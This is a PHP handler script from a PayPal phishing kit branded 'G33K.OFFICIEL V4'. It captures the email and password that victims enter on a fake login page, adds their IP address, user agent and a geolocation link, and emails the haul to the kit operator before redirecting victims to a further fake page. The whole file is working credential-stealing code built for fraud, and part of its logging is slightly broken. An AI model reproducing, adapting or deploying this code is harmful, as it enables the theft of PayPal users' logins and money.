<?php
error_reporting(0);
//PRIV8 SCAM G33K.OFFICIEL V4
session_start();
include("../email.php");
$rand=rand(111611,996999);
$rand2=rand(1116111,9997989);
$md = md5(sha1("ByG33K.OFFICIELTN"));
$aubli = $rand.$md.$rand2;
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? 
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$_SESSION["email"] = $_POST["email"];
$_SESSION["pass"] = $_POST["pass"];
$TN = strlen($_SESSION["pass"]);
$_SESSION['pippa'] = substr($_SESSION['MONSTR_UU'],1,3);
$_SESSION['galant'] = "".$_SESSION['pippa']."_".$_SESSION['MOCNTRCD']."";
if($TN < 8){
	header("location:../websc_login/?country.x=".$_SESSION['MOCNTRCD']."&locale.x=".$_SESSION['galant']."&error=true");
} elseif ($TN >= 8){
	$_SESSION["mrigla"] = 1;
$xxx = "
############## PAYPAL V4 G33K.OFFICIEL ############
Email: ".$_SESSION["email"]."
Password: ".$_SESSION["pass"]."
User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
IP: $ip
Geoiptool: http://geoiptool.de/?ip=".$ip."
############## PAYPAL V4 G33K.OFFICIEL ##########
";
$Subject="PPL PRIV8 V4 - Login - $ip - ".$_SESSION['country_name']."";
$head="From:G33K.OFFICIEL Login <log>";
mail($rezult_mail,$Subject,$xxx,$head);
if($txt == 1)$file = fopen("root-mrx.txt", 'a');
fwrite($file, $text_result);;
header("location:../information/?enc=".md5(microtime())."&p=0&dispatch=".sha1(microtime()).""); }; 

?>